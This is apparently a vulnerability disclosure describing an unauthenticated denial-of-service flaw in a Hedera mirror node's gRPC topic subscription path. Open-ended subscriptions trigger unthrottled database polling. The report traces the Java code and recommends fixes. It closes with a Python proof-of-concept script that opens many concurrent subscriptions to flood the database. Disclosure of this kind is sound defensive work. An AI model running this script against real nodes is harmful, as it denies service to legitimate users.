### Title
Unthrottled DB Polling DoS via Unauthenticated gRPC Topic Subscription Safety Check

### Summary
Any unauthenticated user who opens a gRPC topic subscription without an `endTime` will unconditionally trigger the safety-check path after 1 second, which calls `topicMessageRetriever.retrieve(filter, false)` — the unthrottled retriever. With default settings this issues 12 DB queries of up to 5,000 rows each (60,000 rows) in ~240 ms per subscription. There is no per-IP connection limit, no global subscription cap, and no authentication requirement, so an attacker opening many concurrent connections can generate an unbounded burst of DB queries that exhausts the connection pool and starves legitimate traffic.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` unconditionally schedules a safety check for every subscription:

```java
// TopicMessageServiceImpl.java lines 67-70
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

`TopicContext.isComplete()` returns `false` whenever `endTime == null`:

```java
// TopicMessageServiceImpl.java lines 203-205
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;
    }
```

So for any subscription without an explicit `endTime` (the common case), the safety check fires after exactly 1 second and calls `missingMessages(topicContext, null)`, which routes to:

```java
// TopicMessageServiceImpl.java lines 149
return topicMessageRetriever.retrieve(gapFilter, false);   // throttled = false
```

`gapFilter` is derived from the original filter with no limit added unless the caller set one. Inside `PollingContext`, `throttled=false` selects the unthrottled parameters:

```java
// PollingTopicMessageRetriever.java lines 103-107
RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
numRepeats = unthrottled.getMaxPolls();          // default 12
frequency  = unthrottled.getPollingFrequency();  // default 20 ms
maxPageSize = unthrottled.getMaxPageSize();       // default 5000
```

`isComplete()` for the unthrottled context only returns `true` on `limitHit`:

```java
// PollingTopicMessageRetriever.java lines 121-128
boolean isComplete() {
    boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();
    if (throttled) {
        return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
    }
    return limitHit;   // unthrottled: never stops unless limit is hit
}
```

With no limit in the filter, `limitHit` is always `false`, so all 12 polls execute: **12 × 5,000 = 60,000 rows, 12 DB queries, in ~240 ms per subscription**.

**Root cause:** The safety-check mechanism, designed for internal gap recovery, is triggered by every open-ended subscription from any caller, and the unthrottled retriever has no guard against concurrent abuse.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (default) limits streams per TCP connection but places **no limit on the number of TCP connections** from a single IP.
- There is no per-IP rate limit, no global subscription count limit, and no authentication on the gRPC endpoint.
- `retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))` means transient DB errors cause indefinite retries, compounding load.
- The `@Min(4)` constraint on `maxPolls` and `@Min(1000)` on `maxPageSize` enforce minimums that are still large enough to be abused.

### Impact Explanation
Each attacker TCP connection can hold 5 concurrent subscriptions, each triggering 12 DB queries of 5,000 rows in 240 ms. With `C` attacker connections: `C × 5 × 12 = 60C` DB queries per 240 ms burst. A modest 10-connection attack produces 600 DB queries in 240 ms. PostgreSQL connection pools are typically sized 10–50 connections for the gRPC service; this burst saturates the pool, causing query timeouts for all legitimate subscribers. Because the `retryWhen` clause retries indefinitely, failed queries re-enter the queue, creating a feedback loop. The result is a complete denial of service for the historical message retrieval path and degraded live-message delivery, matching the "Critical: Network not being able to confirm new transactions (total network shutdown)" severity classification.

### Likelihood Explanation
No credentials, API keys, or special network access are required — only the ability to open TCP connections to port 5600. The gRPC `subscribeTopic` RPC is the public API for HCS topic subscriptions. The attack is trivially scriptable with any gRPC client library (e.g., `grpcurl`, the Hedera Java SDK, or a raw HTTP/2 client). It is repeatable: after the 12-poll burst completes (~240 ms), the attacker can cancel and re-subscribe to trigger another burst. The attack is also amplifiable across multiple source IPs.

### Recommendation

1. **Decouple the safety-check retriever from the public subscription path.** The unthrottled retriever should only be invoked when a genuine gap is detected (i.e., `numMissingMessages > 0`), not unconditionally after 1 second for every subscription.
2. **Add a global concurrent-subscription limit** (e.g., via a `Semaphore` or `AtomicLong` guard in `TopicMessageServiceImpl`) that rejects new subscriptions when the server is saturated.
3. **Add per-IP connection limiting** at the Netty/load-balancer layer (e.g., `maxConnectionsPerIp` in Netty or an Envoy/Traefik rate-limit policy on port 5600).
4. **Apply the throttled retriever to the safety check** (`retrieve(gapFilter, true)`) unless the caller is an authenticated internal component.
5. **Enforce a maximum `endTime`** or subscription duration on unauthenticated connections to prevent indefinitely open subscriptions that repeatedly re-arm the safety check.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk-python (or any gRPC client)
# Target: grpc://<mirror-node>:5600

import grpc, threading, time
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "<mirror-node>:5600"
TOPIC_ID = "0.0.1234"          # any existing topic
NUM_CONNECTIONS = 20
STREAMS_PER_CONN = 5           # maxConcurrentCallsPerConnection default

def attack_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(STREAMS_PER_CONN):
        def subscribe():
            req = consensus_service_pb2.ConsensusTopicQuery(
                topicID=...,        # set to TOPIC_ID
                consensusStartTime=Timestamp(seconds=0, nanos=0),
                # NO endTime → isComplete() always false → safety check fires
            )
            try:
                for _ in stub.subscribeTopic(req):
                    pass            # drain; safety check fires after 1s
            except:
                pass
        t = threading.Thread(target=subscribe)
        t.start()
        threads.append(t)
    time.sleep(5)                  # hold connections open for multiple bursts

attack_threads = [threading.Thread(target=attack_connection)
                  for _ in range(NUM_CONNECTIONS)]
for t in attack_threads:
    t.start()
# Result: 20 connections × 5 streams × 12 DB queries = 1200 DB queries
# fired in the first 240ms after the 1-second safety-check delay,
# repeated every time the attacker reconnects.
```
